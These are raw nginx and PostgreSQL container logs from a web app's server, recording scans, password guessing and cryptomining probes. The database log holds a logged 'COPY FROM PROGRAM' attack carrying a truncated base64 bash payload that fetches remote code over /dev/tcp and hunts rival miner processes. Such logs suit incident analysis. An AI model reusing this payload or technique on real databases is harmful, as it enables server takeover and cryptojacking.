nginx-1  | 176.65.139.66 - - [21/Jun/2026:08:27:00 +0000] "GET / HTTP/1.0" 302 0 "-" "Shodan-Pull/1.0"
nginx-1  | 45.142.154.41 - - [21/Jun/2026:08:35:05 +0000] "GET /accounts/login/?next=/ HTTP/1.1" 200 1630 "https://195.209.213.245:443" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
nginx-1  | 45.142.154.41 - - [21/Jun/2026:08:35:06 +0000] "GET /accounts/login/favicon.ico HTTP/1.1" 404 4538 "https://195.209.213.245:443" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
nginx-1  | 45.142.154.41 - - [21/Jun/2026:08:35:08 +0000] "GET /favicon.ico HTTP/1.1" 404 3027 "https://195.209.213.245:443" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
nginx-1  | 152.32.192.241 - - [21/Jun/2026:08:38:01 +0000] "GET / HTTP/1.1" 302 0 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
nginx-1  | 118.193.38.85 - - [21/Jun/2026:08:38:01 +0000] "GET / HTTP/1.1" 302 0 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
nginx-1  | 152.32.192.241 - - [21/Jun/2026:08:38:01 +0000] "GET /accounts/login/?next=/ HTTP/1.1" 200 1630 "http://www.habits-app.ru" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
nginx-1  | 118.193.38.85 - - [21/Jun/2026:08:38:02 +0000] "GET /accounts/login/?next=/ HTTP/1.1" 200 1630 "http://habits-app.ru" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
nginx-1  | 152.32.192.241 - - [21/Jun/2026:08:38:02 +0000] "GET /accounts/login/favicon.ico HTTP/1.1" 404 4539 "http://www.habits-app.ru" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
nginx-1  | 101.36.112.233 - - [21/Jun/2026:08:38:02 +0000] "GET / HTTP/1.1" 302 0 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
nginx-1  | 118.193.38.85 - - [21/Jun/2026:08:38:03 +0000] "GET /accounts/login/favicon.ico HTTP/1.1" 404 4535 "http://habits-app.ru" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
nginx-1  | 101.36.118.228 - - [21/Jun/2026:08:38:03 +0000] "GET / HTTP/1.1" 302 0 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
nginx-1  | 152.32.192.241 - - [21/Jun/2026:08:38:04 +0000] "GET /favicon.ico HTTP/1.1" 404 3028 "http://www.habits-app.ru" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
nginx-1  | 101.36.112.233 - - [21/Jun/2026:08:38:04 +0000] "GET /accounts/login/?next=/ HTTP/1.1" 200 1630 "https://habits-app.ru" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
nginx-1  | 118.193.38.85 - - [21/Jun/2026:08:38:04 +0000] "GET /favicon.ico HTTP/1.1" 404 3024 "http://habits-app.ru" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
nginx-1  | 101.36.118.228 - - [21/Jun/2026:08:38:04 +0000] "GET /accounts/login/?next=/ HTTP/1.1" 200 1630 "https://www.habits-app.ru" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
nginx-1  | 101.36.112.233 - - [21/Jun/2026:08:38:05 +0000] "GET /accounts/login/favicon.ico HTTP/1.1" 404 4536 "https://habits-app.ru" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
nginx-1  | 101.36.118.228 - - [21/Jun/2026:08:38:06 +0000] "GET /accounts/login/favicon.ico HTTP/1.1" 404 4540 "https://www.habits-app.ru" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
nginx-1  | 101.36.112.233 - - [21/Jun/2026:08:38:06 +0000] "GET /favicon.ico HTTP/1.1" 404 3025 "https://habits-app.ru" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
nginx-1  | 101.36.118.228 - - [21/Jun/2026:08:38:07 +0000] "GET /favicon.ico HTTP/1.1" 404 3029 "https://www.habits-app.ru" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
nginx-1  | 93.123.72.183 - - [21/Jun/2026:08:46:19 +0000] "GET /SDK/webLanguage HTTP/1.1" 404 3038 "-" "Mozilla/5.0"
nginx-1  | 165.245.200.192 - - [21/Jun/2026:09:02:34 +0000] "GET /_profiler/phpinfo HTTP/1.1" 404 3044 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
nginx-1  | 165.245.200.192 - - [21/Jun/2026:09:02:35 +0000] "GET /_profiler/phpinfo HTTP/1.1" 404 3044 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
nginx-1  | 165.245.200.192 - - [21/Jun/2026:09:02:37 +0000] "GET /_profiler/phpinfo HTTP/1.1" 404 3044 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
nginx-1  | 165.245.200.192 - - [21/Jun/2026:09:02:41 +0000] "GET /_profiler/phpinfo HTTP/1.1" 404 3044 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
nginx-1  | 165.245.200.192 - - [21/Jun/2026:09:02:49 +0000] "GET /_profiler/phpinfo HTTP/1.1" 404 3044 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
nginx-1  | 165.245.200.192 - - [21/Jun/2026:09:03:05 +0000] "GET /_profiler/phpinfo HTTP/1.1" 404 3044 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
nginx-1  | 20.172.67.176 - - [21/Jun/2026:09:05:09 +0000] "GET /owa/auth/logon.aspx HTTP/1.1" 404 3051 "-" "Mozilla/5.0 zgrab/0.x"
nginx-1  | 179.43.186.241 - - [21/Jun/2026:09:05:23 +0000] "GET /owa/ HTTP/1.1" 404 3006 "-" "Mozilla/5.0 (compatible; ExchangeScanner/2.1)"
nginx-1  | 179.43.186.241 - - [21/Jun/2026:09:05:23 +0000] "GET /ews/exchange.asmx HTTP/1.1" 404 3045 "-" "Mozilla/5.0 (compatible; ExchangeScanner/2.1)"
nginx-1  | 179.43.186.241 - - [21/Jun/2026:09:05:24 +0000] "GET /autodiscover/autodiscover.xml HTTP/1.1" 404 3081 "-" "Mozilla/5.0 (compatible; ExchangeScanner/2.1)"
nginx-1  | 179.43.186.241 - - [21/Jun/2026:09:05:24 +0000] "GET /Microsoft-Server-ActiveSync HTTP/1.1" 404 3075 "-" "Mozilla/5.0 (compatible; ExchangeScanner/2.1)"
nginx-1  | 179.43.186.241 - - [21/Jun/2026:09:05:24 +0000] "GET /ecp/ HTTP/1.1" 404 3006 "-" "Mozilla/5.0 (compatible; ExchangeScanner/2.1)"
nginx-1  | 179.43.186.241 - - [21/Jun/2026:09:05:24 +0000] "GET /mapi/ HTTP/1.1" 404 3009 "-" "Mozilla/5.0 (compatible; ExchangeScanner/2.1)"
nginx-1  | 179.43.186.241 - - [21/Jun/2026:09:05:24 +0000] "GET /rpc/ HTTP/1.1" 404 3006 "-" "Mozilla/5.0 (compatible; ExchangeScanner/2.1)"
nginx-1  | 91.92.42.243 - - [21/Jun/2026:09:09:30 +0000] "GET / HTTP/1.1" 302 0 "-" "check-host.cc Intel Platform (https://check-host.cc/about/scan-infra; abuse@check-host.cc)"
nginx-1  | 104.23.221.204 - - [21/Jun/2026:09:11:57 +0000] "GET /wp-admin/install.php?step=1 HTTP/1.1" 404 3058 "-" "http://habits-app.ru/wp-admin/install.php?step=1"
nginx-1  | 185.213.175.171 - - [21/Jun/2026:09:14:38 +0000] "\x16\x03\x01\x02\x00\x01\x00\x01\xFC\x03\x03\xD9\x98\x08\x9C\xDD{\xDF\xE3\xFEuP\xA611\xC2\xF6\xC1\xF5\xDF\x0C\x99e\xA1\x04]\x89\xC6?\xFF\xD4\xA7\x19 \xABq\xE8\xA1\xA0\xBC\
x03,#\xDDGS\xCDs\x92\xE8E\xB8\xDD\xD2icX\x87\xF4\xB3\x0E\xA1\xB5\x92\xB3\xA7\x00$\x13\x02\x13\x03\x13\x01\xC0,\xC00\xC0+\xC0/\xCC\xA9\xCC\xA8\xC0$\xC0(\xC0#\xC0'\x00\x9F\x00\x9E\x00k\x00g\x00\xFF\x01\x00\x01\x8F\x00\x0B\x00\x04\x03\x00\x01\x02\x00" 400 157 "-" "-"
nginx-1  | 185.213.175.171 - - [21/Jun/2026:09:14:39 +0000] "{\x22id\x22: 1, \x22method\x22: \x22mining.subscribe\x22, \x22params\x22: [\x22cpuminer/2.5.1\x22]}" 400 157 "-" "-"
nginx-1  | 185.213.175.171 - - [21/Jun/2026:09:14:40 +0000] "{\x22id\x22: 1, \x22method\x22: \x22mining.subscribe\x22, \x22params\x22: [\x22MinerName/1.0.0\x22, \x22EthereumStratum/1.0.0\x22]}" 400 157 "-" "-"
nginx-1  | 185.213.175.171 - - [21/Jun/2026:09:14:42 +0000] "{\x22id\x22:1,\x22method\x22:\x22eth_submitLogin\x22,\x22worker\x22:\x22igwrcvap\x22,\x22params\x22:[\x220xe10ff7133c38e6d18f98dbc7d97c78e155df8937\x22,\x22x\x22],\x22jsonrpc\x22:\x222.0\x22}" 400 157 "-" "-"
nginx-1  | 185.213.175.171 - - [21/Jun/2026:09:14:42 +0000] "{\x22id\x22:1,\x22jsonrpc\x22:\x222.0\x22,\x22method\x22:\x22login\x22,\x22params\x22:{\x22login\x22:\x2249JjsK7E7KeMdRvAwNpprKJVCBbBMEgR5JTJBPCkLgePFSsK74QYHmrUUuHL4jgCTD
RVjKLXwGCzwhgamL7z73da1BThcqK\x22,\x22pass\x22:\x22x\x22,\x22agent\x22:\x22XMRig/6.15.3 (Windows NT 10.0; Win64; x64) libuv/1.42.0 msvc/2019\x22,\x22algo\x22:[\x22cn/1\x22,\x22cn/2\x22,\x22cn/r\x22,\x22cn/fast\x22,\x22cn/half\x22,\x
22cn/xao\x22,\x22cn/rto\x22,\x22cn/rwz\x22,\x22cn/zls\x22,\x22cn/double\x22,\x22cn/ccx\x22,\x22cn-lite/1\x22,\x22cn-heavy/0\x22,\x22cn-heavy/tube\x22,\x22cn-heavy/xhv\x22,\x22cn-pico\x22,\x22cn-pico/tlo\x22,\x22cn/upx2\x22,\x22rx/0\x22,\x22rx/wow\x22,\x22rx/arq\x22,\x22rx/graft\x22,\x22rx/sfx\x22,\x22rx/keva\x22,\x22argon2/chukwa\x22,\x22argon2/chukwav2\x22,\x22argon2/ninja\x22,\x22astrobwt\x22]}}" 400 157 "-" "-"
nginx-1  | 185.213.175.171 - - [21/Jun/2026:09:14:43 +0000] "GET / HTTP/1.1" 302 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
nginx-1  | 185.213.175.171 - - [21/Jun/2026:09:14:44 +0000] "GET /accounts/login/?next=/ HTTP/1.1" 200 1630 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
nginx-1  | 185.213.175.171 - 1GP8z4phw8zuE6n2S3s1XDdyPpjPjukRUg [21/Jun/2026:09:14:47 +0000] "POST / HTTP/1.1" 403 3346 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
nginx-1  | 185.213.175.171 - 0x92f74901966670ed67bf22d8f4307bc6e2fbed5e [21/Jun/2026:09:14:48 +0000] "POST / HTTP/1.1" 403 3346 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
nginx-1  | 185.213.175.171 - - [21/Jun/2026:09:14:49 +0000] "GET /WuEL HTTP/1.1" 404 3005 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; ; NCLIENT50_AAPCDA5841E333)"
nginx-1  | 185.213.175.171 - - [21/Jun/2026:09:14:50 +0000] "GET stager64 HTTP/1.1" 400 157 "-" "-"
nginx-1  | 185.213.175.171 - - [21/Jun/2026:09:14:50 +0000] "GET /a HTTP/1.1" 404 2996 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
nginx-1  | 185.213.175.171 - - [21/Jun/2026:09:14:50 +0000] "GET /download/file.ext HTTP/1.1" 404 3044 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
nginx-1  | 185.213.175.171 - - [21/Jun/2026:09:14:51 +0000] "GET /SiteLoader HTTP/1.1" 404 3023 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
nginx-1  | 185.213.175.171 - - [21/Jun/2026:09:14:52 +0000] "GET /mPlayer HTTP/1.1" 404 3014 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
nginx-1  | 2026/06/21 09:14:52 [error] 29#29: *1773 client intended to send too large body: 10485761 bytes, client: 185.213.175.171, server: habits-app.ru, request: "POST / HTTP/1.1", host: "195.209.213.245"
nginx-1  | 185.213.175.171 - - [21/Jun/2026:09:14:52 +0000] "POST / HTTP/1.1" 413 585 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
nginx-1  | 185.213.175.171 - - [21/Jun/2026:09:14:53 +0000] "GET / HTTP/1.1" 400 635 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
nginx-1  | 128.14.236.41 - - [21/Jun/2026:09:24:16 +0000] "GET / HTTP/1.1" 302 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
nginx-1  | 128.14.236.41 - - [21/Jun/2026:09:24:35 +0000] "GET /accounts/login/?next=/ HTTP/1.1" 200 1630 "https://195.209.213.245/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
nginx-1  | 128.14.236.41 - - [21/Jun/2026:09:24:35 +0000] "GET /favicon.ico HTTP/1.1" 404 3027 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
nginx-1  | 128.14.236.41 - - [21/Jun/2026:09:24:36 +0000] "GET /robots.txt HTTP/1.1" 404 3024 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
nginx-1  | 128.14.236.41 - - [21/Jun/2026:09:24:37 +0000] "GET /sitemap.xml HTTP/1.1" 404 3027 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
nginx-1  | 128.14.236.41 - - [21/Jun/2026:09:24:41 +0000] "GET /config.json HTTP/1.1" 404 3027 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
nginx-1  | 3.87.27.156 - - [21/Jun/2026:09:57:56 +0000] "GET /api/env HTTP/1.0" 404 6477 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
nginx-1  | 130.12.180.52 - - [21/Jun/2026:10:03:26 +0000] "CONNECT check.easyproxy.xyz:443 HTTP/1.1" 405 157 "-" "Go-http-client/1.1"
nginx-1  | 185.12.59.118 - - [21/Jun/2026:10:05:24 +0000] "GET /Dr0v HTTP/1.1" 404 3006 "-" "-"
nginx-1  | 95.24.48.186 - - [21/Jun/2026:10:07:31 +0000] "GET /tasks/ HTTP/1.1" 500 192480 "https://habits-app.ru/notes/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36"
nginx-1  | 95.24.48.186 - - [21/Jun/2026:10:07:52 +0000] "GET /notes/ HTTP/1.1" 500 192474 "https://habits-app.ru/notes/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36"
nginx-1  | 95.24.48.186 - - [21/Jun/2026:10:08:41 +0000] "GET / HTTP/1.1" 500 192224 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36"
nginx-1  | 45.198.224.5 - - [21/Jun/2026:10:10:20 +0000] "GET / HTTP/1.1" 302 0 "http://195.209.213.245:80/cgi-bin/index2.asp" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
db-1     | 2026-06-20 18:37:55.286 UTC [791] DETAIL:  Role "app" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 18:39:26.893 UTC [792] FATAL:  password authentication failed for user "app"
db-1     | 2026-06-20 18:39:26.893 UTC [792] DETAIL:  Role "app" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 18:40:58.597 UTC [793] FATAL:  password authentication failed for user "app"
db-1     | 2026-06-20 18:40:58.597 UTC [793] DETAIL:  Role "app" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 18:42:10.365 UTC [794] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-20 18:42:10.365 UTC [794] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 18:42:15.721 UTC [795] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-20 18:42:15.721 UTC [795] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 18:42:30.851 UTC [796] FATAL:  password authentication failed for user "app"
db-1     | 2026-06-20 18:42:30.851 UTC [796] DETAIL:  Role "app" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 18:43:54.416 UTC [797] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-20 18:43:54.416 UTC [797] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 18:43:58.079 UTC [798] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-20 18:43:58.079 UTC [798] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 18:44:02.413 UTC [799] FATAL:  password authentication failed for user "app"
db-1     | 2026-06-20 18:44:02.413 UTC [799] DETAIL:  Role "app" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 18:45:34.620 UTC [800] FATAL:  password authentication failed for user "app"
db-1     | 2026-06-20 18:45:34.620 UTC [800] DETAIL:  Role "app" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 18:47:06.583 UTC [801] FATAL:  password authentication failed for user "app"
db-1     | 2026-06-20 18:47:06.583 UTC [801] DETAIL:  Role "app" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 18:47:27.139 UTC [802] FATAL:  password authentication failed for user "woglet"
db-1     | 2026-06-20 18:47:27.139 UTC [802] DETAIL:  Role "woglet" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 18:47:36.047 UTC [803] FATAL:  password authentication failed for user "woglet"
db-1     | 2026-06-20 18:47:36.047 UTC [803] DETAIL:  Role "woglet" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-20 18:47:47.130 UTC [1] LOG:  server process (PID 804) was terminated by signal 9: Killed
db-1     | 2026-06-20 18:47:47.130 UTC [1] DETAIL:  Failed process was running: DROP TABLE IF EXISTS tests; CREATE TABLE tests(cmd_output text); COPY tests FROM PROGRAM 'echo ZnVuY3Rpb24gX19jdXJsKCkgewogIHJlYWQgcHJvdG8gc2VydmVyIHBhd
GggPDw8IiQocHJpbnRmICclcycgIiQxIiB8IHNlZCAncyM6Ly8jICM7cyMvIyAjJykiCiAgRE9DPSIvJHBhdGgiCiAgSE9TVD0iJHtzZXJ2ZXIlJToqfSIKICBQT1JUPSIke3NlcnZlciMjKjp9IgogIFsgIiRIT1NUIiA9ICIkUE9SVCIgXSAmJiBQT1JUPTgwCiAgZXhlYyAzPD4vZGV2L3RjcC8kSE9TVC8kU
E9SVAogIHByaW50ZiAiR0VUICVzIEhUVFAvMS4xXHJcbkhvc3Q6ICVzXHJcbkNvbm5lY3Rpb246IGNsb3NlXHJcblxyXG4iICIkRE9DIiAiJEhPU1QiID4mMwogIHdoaWxlIElGUz0gcmVhZCAtciBsaW5lIDwmMzsgZG8KICAgIGxpbmU9JHtsaW5lJSQnXHInfQogICAgWyAteiAiJGxpbmUiIF0gJiYgYnJlY
WsKICBkb25lCiAgY2F0IDwmMwogIGV4ZWMgMz4mLQp9Cgpmb3IgcGlkIGluIC9wcm9jL1swLTldKjsgZG8gcGlkPSR7cGlkIyMqL307IHJlc3VsdD0kKGxzIC1sIC9wcm9jLyRwaWQvZXhlKTsgY2FzZSAkcmVzdWx0IGluICoiL3RtcC9teXNxbCIqfCoiL3RtcC9pbml0Iip8KiIvdG1wL3dhdGNoZG9nIip8KiIvdmFyL1NvZmlhIip8KiJtY3JubGhveSIqfCoicGdfbWVtIip8KiJ4ODYiKnwqIm1lbWZkIip8KiIubWV0YWJhc2UiKnwqImNhdCIqfCoiL3RtcC8uIip8KiIvdG1wLy5yLnJway8iKnwqImphdmF2bTY0Iip8KiJodHRwZCIqfCoi
db-1     | 2026-06-20 18:47:47.131 UTC [1] LOG:  terminating any other active server processes
db-1     | 2026-06-20 18:47:47.134 UTC [1] LOG:  all server processes terminated; reinitializing
db-1     | 2026-06-20 18:47:47.172 UTC [806] LOG:  database system was interrupted; last known up at 2026-06-20 18:13:26 UTC
db-1     | 2026-06-20 18:47:47.241 UTC [806] LOG:  database system was not properly shut down; automatic recovery in progress
db-1     | 2026-06-20 18:47:47.246 UTC [806] LOG:  redo starts at 0/1BA00C0
db-1     | 2026-06-20 18:47:47.247 UTC [806] LOG:  invalid record length at 0/1BA00F8: expected at least 24, got 0
db-1     | 2026-06-20 18:47:47.247 UTC [806] LOG:  redo done at 0/1BA00C0 system usage: CPU: user: 0.00 s, system: 0.00 s, elapsed: 0.00 s
db-1     | 2026-06-20 18:47:47.254 UTC [807] LOG:  checkpoint starting: end-of-recovery immediate wait
